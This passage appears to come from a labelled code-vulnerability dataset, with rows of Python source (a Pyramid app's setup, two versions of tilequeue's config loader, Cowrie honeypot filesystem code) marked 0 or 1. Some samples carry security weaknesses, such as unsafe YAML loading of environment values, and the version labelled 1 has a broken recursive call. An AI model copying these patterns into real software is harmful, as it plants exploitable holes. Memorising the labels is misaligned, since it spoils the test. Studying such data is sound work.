    #        site_url=config.registry.settings.get('server.url')
    #    ))
    # No login provider
    if not login_providers and config.registry.settings.get('karakara.server.mode') == 'development':
        # Auto login if no service keys are provided
        social_login.add_login_provider(NullLoginProvider())
        social_login.user_store = NullComunityUserStore()
    template_helpers.javascript_inline['comunity'] = social_login.html_includes

    # Renderers ----------------------------------------------------------------

    # AllanC - currently the auto_format decorator does all the formatting work
    #          it would be far preferable to use the pyramid renderer framework
    #          issue is, we want to set the renderer to be dynamic based on the url given
    #          I don't want to define EVERY method with loads of renderer tags
    #          and I don't want to define 5+ routes for every view callable with differnt formats
    #          We need a nice way of doing this in pyramid, and right now, after HOURS of trawling
    #          the doc and experimenting, I cant find one.
    #from .renderers.auto_render_factory import AutoRendererFactory, handle_before_render
    #config.add_renderer(None   , AutoRendererFactory) #'renderers.auto_render_factory.auto_renderer_factory'
    #config.add_renderer('.html', 'pyramid.mako_templating.renderer_factory')
    #config.add_subscriber(handle_before_render , pyramid.events.BeforeRender) # maybe use this to set renderer?
    # closeset ive seen
    #   http://zhuoqiang.me/a/restful-pyramid
    #   http://stackoverflow.com/questions/4633320/is-there-a-better-way-to-switch-between-html-and-json-output-in-pyramid


    # Routes -------------------------------------------------------------------

    def settings_path(key):
        path = os.path.join(os.getcwd(), config.registry.settings[key])
        if not os.path.isdir(path):
            log.error(f'Unable to add_static_view {key}:{path}')
        return path

    # Static Routes
    config.add_static_view(name='ext', path=settings_path('static.externals'))  # cache_max_age=3600
    config.add_static_view(name='static', path=settings_path('static.assets'))  # cache_max_age=3600
    config.add_static_view(name='player', path=settings_path('static.player'))

    # AllanC - it's official ... static route setup and generation is a mess in pyramid
    #config.add_static_view(name=settings[""static.media"" ], path=""karakara:media"" )
    config.add_static_view(name='files', path=config.registry.settings['static.processmedia2.config']['path_processed'])

    # Routes
    def append_format_pattern(route):
        return re.sub(r'{(.*)}', r'{\1:[^/\.]+}', route) #+ r'{spacer:[.]?}{format:(%s)?}' % '|'.join(registered_formats())

    #config.add_route('home'          , append_format_pattern('/')              )
    #config.add_route('track'         , append_format_pattern('/track/{id}')    )
    #config.add_route('track_list'    , append_format_pattern('/track_list')    )
    config.add_route('track_import'  , append_format_pattern('/track_import')  )
    config.add_route('queue'         , append_format_pattern('/queue')         )
    config.add_route('priority_tokens', append_format_pattern('/priority_tokens'))
    config.add_route('fave'          , append_format_pattern('/fave')          )
    config.add_route('message'       , append_format_pattern('/message')          )
    config.add_route('admin_toggle'  , append_format_pattern('/admin')         )
    config.add_route('admin_lock'    , append_format_pattern('/admin_lock')    )
    config.add_route('remote'        , append_format_pattern('/remote')        )
    config.add_route('feedback'      , append_format_pattern('/feedback')      )
    config.add_route('settings'      , append_format_pattern('/settings')      )
    config.add_route('random_images' , append_format_pattern('/random_images') )
    config.add_route('inject_testdata' , append_format_pattern('/inject_testdata') )
    config.add_route('stats'         , append_format_pattern('/stats')         )
    config.add_route('comunity'      , append_format_pattern('/comunity')      )
    config.add_route('comunity_login', append_format_pattern('/comunity/login'))
    config.add_route('comunity_logout', append_format_pattern('/comunity/logout'))
    config.add_route('comunity_list' , append_format_pattern('/comunity/list') )
    config.add_route('comunity_track', append_format_pattern('/comunity/track/{id}'))
    config.add_route('comunity_upload', append_format_pattern('/comunity/upload'))
    config.add_route('comunity_settings', append_format_pattern('/comunity/settings'))
    config.add_route('comunity_processmedia_log', append_format_pattern('/comunity/processmedia_log'))

    config.add_route('search_tags'   , '/search_tags/{tags:.*}')
    config.add_route('search_list'   , '/search_list/{tags:.*}')

    # Upload extras -----
    #config.add_static_view(name=settings['upload.route.uploaded'], path=settings['upload.path'])  # the 'upload' route above always matchs first
    config.add_route('upload', '/upload{sep:/?}{name:.*}')

    # Events -------------------------------------------------------------------
    config.add_subscriber(add_localizer_to_request, pyramid.events.NewRequest)
    config.add_subscriber(add_render_globals_to_template, pyramid.events.BeforeRender)

    # Return -------------------------------------------------------------------
    config.scan(ignore='.tests')
    config.scan('externals.lib.pyramid_helpers.views')
    return config.make_wsgi_app()


def add_localizer_to_request(event):
    request = event.request
    localizer = get_localizer(request)
    def auto_translate(*args, **kwargs):
        return localizer.translate(translation_string_factory(*args, **kwargs))
    request.localizer = localizer
    request.translate = auto_translate


def add_render_globals_to_template(event):
    request = event['request']
    event['_'] = request.translate
    event['localizer'] = request.localizer
    event['h'] = template_helpers
/n/n/n",1
154,75f9e819e7e5c2132d29e5236739fae847279b32,"tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container[key], rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",0
155,75f9e819e7e5c2132d29e5236739fae847279b32,"/tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container, rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",1
156,cb2c5d4f654cc4709c3edc97ec7216c210901c78,"cowrie/shell/fs.py/n/n# Copyright (c) 2009-2014 Upi Tamminen <desaster@gmail.com>
# See the COPYRIGHT file for more information

""""""
This module contains ...
""""""

from __future__ import division, absolute_import

try:
    import cPickle as pickle
except:
    import pickle

import os
import time
import fnmatch
import hashlib
import re
import stat
import errno

from twisted.python import log

from cowrie.core.config import CONFIG

PICKLE = pickle.load(open(CONFIG.get('honeypot', 'filesystem_file'), 'rb'))

A_NAME, \
    A_TYPE, \
    A_UID, \
    A_GID, \
    A_SIZE, \
    A_MODE, \
    A_CTIME, \
    A_CONTENTS, \
    A_TARGET, \
    A_REALFILE = list(range(0, 10))
T_LINK, \
    T_DIR, \
    T_FILE, \
    T_BLK, \
    T_CHR, \
    T_SOCK, \
    T_FIFO = list(range(0, 7))

class TooManyLevels(Exception):
    """"""
    62 ELOOP Too many levels of symbolic links.  A path name lookup involved more than 8 symbolic links.
    raise OSError(errno.ELOOP, os.strerror(errno.ENOENT))
    """"""
    pass



class FileNotFound(Exception):
    """"""
    raise OSError(errno.ENOENT, os.strerror(errno.ENOENT))
    """"""
    pass



class HoneyPotFilesystem(object):
    """"""
    """"""

    def __init__(self, fs, cfg):
        self.fs = fs
        self.cfg = cfg

        # Keep track of open file descriptors
        self.tempfiles = {}
        self.filenames = {}

        # Keep count of new files, so we can have an artificial limit
        self.newcount = 0

        # Get the honeyfs path from the config file and explore it for file
        # contents:
        self.init_honeyfs(self.cfg.get('honeypot', 'contents_path'))


    def init_honeyfs(self, honeyfs_path):
        """"""
        Explore the honeyfs at 'honeyfs_path' and set all A_REALFILE attributes on
        the virtual filesystem.
        """"""

        for path, directories, filenames in os.walk(honeyfs_path):
            for filename in filenames:
                realfile_path = os.path.join(path, filename)
                virtual_path = '/' + os.path.relpath(realfile_path, honeyfs_path)

                f = self.getfile(virtual_path, follow_symlinks=False)
                if f and f[A_TYPE] == T_FILE:
                    self.update_realfile(f, realfile_path)

    def resolve_path(self, path, cwd):
        """"""
        This function does not need to be in this class, it has no dependencies
        """"""
        pieces = path.rstrip('/').split('/')

        if path[0] == '/':
            cwd = []
        else:
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]

        while 1:
            if not len(pieces):
                break
            piece = pieces.pop(0)
            if piece == '..':
                if len(cwd): cwd.pop()
                continue
            if piece in ('.', ''):
                continue
            cwd.append(piece)

        return '/%s' % ('/'.join(cwd),)


    def resolve_path_wc(self, path, cwd):
        """"""
        Resolve_path with wildcard support (globbing)
        """"""
        pieces = path.rstrip('/').split('/')
        if len(pieces[0]):
            cwd = [x for x in cwd.split('/') if len(x) and x is not None]
            path = path[1:]
        else:
            cwd, pieces = [], pieces[1:]
        found = []
        def foo(p, cwd):
            if not len(p):
                found.append('/%s' % ('/'.join(cwd),))
            elif p[0] == '.':
                foo(p[1:], cwd)
            elif p[0] == '..':
                foo(p[1:], cwd[:-1])
            else:
                names = [x[A_NAME] for x in self.get_path('/'.join(cwd))]
                matches = [x for x in names if fnmatch.fnmatchcase(x, p[0])]
                for match in matches:
                    foo(p[1:], cwd + [match])
        foo(pieces, cwd)
        return found


    def get_path(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system objects for a directory
        """"""
        cwd = self.fs
        for part in path.split('/'):
            if not len(part):
                continue
            ok = False
            for c in cwd[A_CONTENTS]:
                if c[A_NAME] == part:
                    if c[A_TYPE] == T_LINK:
                        cwd = self.getfile(c[A_TARGET],
                            follow_symlinks=follow_symlinks)
                    else:
                        cwd = c
                    ok = True
                    break
            if not ok:
                raise FileNotFound
        return cwd[A_CONTENTS]


    def exists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns False for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=True)
        if f is not False:
            return True


    def lexists(self, path):
        """"""
        Return True if path refers to an existing path.
        Returns True for broken symbolic links.
        """"""
        f = self.getfile(path, follow_symlinks=False)
        if f is not False:
            return True


    def update_realfile(self, f, realfile):
        """"""
        """"""
        if not f[A_REALFILE] and os.path.exists(realfile) and \
                not os.path.islink(realfile) and os.path.isfile(realfile) and \
                f[A_SIZE] < 25000000:
            f[A_REALFILE] = realfile


    def getfile(self, path, follow_symlinks=True):
        """"""
        This returns the Cowrie file system object for a path
        """"""
        if path == '/':
            return self.fs
        pieces = path.strip('/').split('/')
        cwd = ''
        p = self.fs
        for piece in pieces:
            if piece not in [x[A_NAME] for x in p[A_CONTENTS]]:
                return False
            for x in p[A_CONTENTS]:
                if x[A_NAME] == piece:
                    if piece == pieces[-1] and follow_symlinks==False:
                        p = x
                    elif x[A_TYPE] == T_LINK:
                        if x[A_TARGET][0] == '/':
                            # Absolute link
                            p = self.getfile(x[A_TARGET],
                                follow_symlinks=follow_symlinks)
                        else:
                            # Relative link
                            p = self.getfile('/'.join((cwd, x[A_TARGET])),
                                follow_symlinks=follow_symlinks)
                        if p == False:
                            # Broken link
                            return False
                    else:
                        p = x
            # cwd = '/'.join((cwd, piece))
        return p


    def file_contents(self, target):
        """"""
        Retrieve the content of a file in the honeyfs
        It follows links.
        It tries A_REALFILE first and then tries honeyfs directory
        """"""
        path = self.resolve_path(target, os.path.dirname(target))
        if not path or not self.exists(path):
            raise FileNotFound
        f = self.getfile(path)
        if f[A_TYPE] == T_DIR:
            raise IsADirectoryError
        elif f[A_TYPE] == T_FILE and f[A_REALFILE]:
            return open(f[A_REALFILE], 'rb').read()
        elif f[A_TYPE] == T_FILE and f[A_SIZE] == 0:
